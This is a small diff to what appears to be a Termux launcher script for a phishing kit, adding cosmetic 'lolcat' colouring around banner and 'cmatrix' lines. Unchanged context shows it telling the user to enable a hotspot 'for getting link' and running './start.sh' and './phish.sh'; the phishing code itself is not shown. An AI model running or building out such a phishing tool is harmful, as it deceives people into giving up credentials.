@@ -1,4 +1,5 @@
 apt update && apt upgrade
+pkg install lolcat
 pkg install cmatrix
 pkg install figlet
 figlet Starting!!
@@ -12,4 +13,4 @@ figlet Please switch on hotspot for getting link
 ./start.sh
 ./phish.sh
 figlet Thankyou!
-cmatrix
+cmatrix | lolcat
